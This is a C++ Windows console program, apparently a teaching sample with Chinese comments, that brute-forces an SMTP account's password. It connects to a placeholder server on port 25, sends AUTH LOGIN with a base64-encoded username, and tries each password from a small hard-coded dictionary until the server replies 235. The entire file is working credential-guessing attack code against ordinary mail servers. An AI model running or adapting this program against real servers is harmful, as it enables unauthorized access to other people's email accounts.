// mailcrack.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "mailcrack.h"

#include <stdio.h>
#include <WinSock2.h>
#pragma comment (lib, "ws2_32");

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 唯一的应用程序对象

CWinApp theApp;

using namespace std;

static const char *codes =   
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";  

static const unsigned char map[256] = {  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,  
    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,  
    52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,  
    255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,  
    7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,  
    19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,  
    255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,  
    37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,  
    49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,  
    255, 255, 255, 255 };  

int base64_encode(const unsigned char *in,  unsigned long len,   
                  unsigned char *out)  
{  
    unsigned long i, len2, leven;  
    unsigned char *p;  
    /* valid output size ? */  
    len2 = 4 * ((len + 2) / 3);  
    p = out;  
    leven = 3*(len / 3);  
    for (i = 0; i < leven; i += 3) {  
        *p++ = codes[in[0] >> 2];  
        *p++ = codes[((in[0] & 3) << 4) + (in[1] >> 4)];  
        *p++ = codes[((in[1] & 0xf) << 2) + (in[2] >> 6)];  
        *p++ = codes[in[2] & 0x3f];  
        in += 3;  
    }  
    /* Pad it if necessary...  */  
    if (i < len) {  
        unsigned a = in[0];  
        unsigned b = (i+1 < len) ? in[1] : 0;  
        unsigned c = 0;  

        *p++ = codes[a >> 2];  
        *p++ = codes[((a & 3) << 4) + (b >> 4)];  
        *p++ = (i+1 < len) ? codes[((b & 0xf) << 2) + (c >> 6)] : '=';  
        *p++ = '=';  
    }  

    /* append a NULL byte */  
    *p = '\0';  

    return p - out;  
}  

int base64_decode(const unsigned char *in, unsigned char *out)  
{  
    unsigned long t, x, y, z;  
    unsigned char c;  
    int g = 3;  

    for (x = y = z = t = 0; in[x]!=0;) {  
        c = map[in[x++]];  
        if (c == 255) return -1;  
        if (c == 253) continue;  
        if (c == 254) { c = 0; g--; }  
        t = (t<<6)|c;  
        if (++y == 4) {  
            //          if (z + g > *outlen) { return CRYPT_BUFFER_OVERFLOW; }  
            out[z++] = (unsigned char)((t>>16)&255);  
            if (g > 1) out[z++] = (unsigned char)((t>>8)&255);  
            if (g > 2) out[z++] = (unsigned char)(t&255);  
            y = t = 0;  
        }  
    }  

    return z;  
}  
// 模拟一串字典
char *dict[5] = {"12345", "123456", "1234567", "111", "22222"};

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// 初始化 MFC 并在失败时显示错误
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: 更改错误代码以符合您的需要
			_tprintf(_T("错误: MFC 初始化失败\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: 在此处为应用程序的行为编写代码。
		}
	}
	else
	{
		// TODO: 更改错误代码以符合您的需要
		_tprintf(_T("错误: GetModuleHandle 失败\n"));
		nRetCode = 1;
	}

    // 初始化WinSock
    WSADATA wsaData = { 0 };
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 循环读取字典
    for ( int i = 0; i <= 4; i ++ )
    {
        char in[30] = { 0 };
        char out[MAXBYTE] = { 0 };

        SOCKET s = socket(PF_INET, SOCK_STREAM, 0);
        sockaddr_in saddr = { 0 };
        saddr.sin_family = AF_INET;
        // 连接SMTP服务器
        saddr.sin_addr.S_un.S_addr = inet_addr("xxx.xxx.xxx.xxx");
        // 连接SMTP服务的端口号
        saddr.sin_port = htons(25);

        // 发送/接收通信数据的缓冲区
        char szBuff[MAX_PATH] = { 0 };

        int nRet = connect(s, (SOCKADDR*)&saddr, sizeof(saddr));

        recv(s, szBuff, MAXBYTE, 0);
        printf("%s \r\n", szBuff);

        lstrcpy(szBuff, "auth login\r\n");
        send(s, szBuff, strlen(szBuff), 0);
        printf("%s \r\n", szBuff);

        recv(s, szBuff, MAXBYTE, 0);
        printf("%s \r\n", szBuff);

        lstrcpy(in, "xxx");
        base64_encode((const unsigned char *)in, lstrlen(in), (unsigned char *)out);
        lstrcpy(szBuff, out);
        lstrcat(szBuff, "\r\n");
        send(s, szBuff, strlen(szBuff), 0);
        printf("%s \r\n", szBuff);

        recv(s, szBuff, MAXBYTE, 0);
        printf("%s \r\n", szBuff);

        lstrcpy(in, (LPCSTR)(*(dict + i)));
        base64_encode((const unsigned char *)in, lstrlen(in), (unsigned char *)out);
        lstrcpy(szBuff, out);
        lstrcat(szBuff, "\r\n");
        send(s, szBuff, strlen(szBuff), 0);
        printf("%s \r\n", szBuff);

        recv(s, szBuff, MAXBYTE, 0);
        printf("%s \r\n", szBuff);

        // if ( lstrcmp(szBuff, "235 go ahead\r\n") == 0 )
        if ( strstr(szBuff, "235") )
        {
            printf("Success \r\n");
            printf("%s\r\n", (char *)(*(dict + i)));
            closesocket(s);
            break;
        } 
        else
        {
            printf("Faild \r\n");
        }

        closesocket(s);

    }
    WSACleanup();

	return nRetCode;
}
